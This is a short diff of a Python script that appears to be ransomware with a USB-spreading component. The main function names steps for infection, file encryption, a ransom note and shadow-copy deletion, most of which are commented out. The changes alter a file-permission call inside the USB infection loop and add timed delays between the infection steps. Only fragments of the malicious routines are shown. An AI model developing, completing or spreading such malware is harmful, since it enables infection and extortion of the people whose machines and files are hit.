@@ -2,6 +2,7 @@
 import getpass
 import os
 import subprocess
+import stat
 import time
 
 import sys
@@ -55,7 +56,7 @@ def usb_infection():
                                     g.write(lines + '\n' + line)
                                     g.close()
                                     c.close()
-                                    os.chmod(file, 777)
+                                    os.chmod(file, stat.S_IRWXU)
                             else:
                                 pass
                     except Exception:
@@ -161,14 +162,16 @@ def main():
     # Hides the terminal console to prevent suspicion while working in background
     # hide = win32gui.GetForegroundWindow()
     # win32gui.ShowWindow(hide, win32con.SW_HIDE)
+    time.sleep(5)
     virus_property()
+    time.sleep(5)
     usb_infection()
+    time.sleep(5)
     # find_file()
     # encrypt_file()
     message()
     # ransom_note()
     # show_ransom_note()
-    # ftp_work()
     # dlt_shadow_copy()
     # delete_ransomware()
 
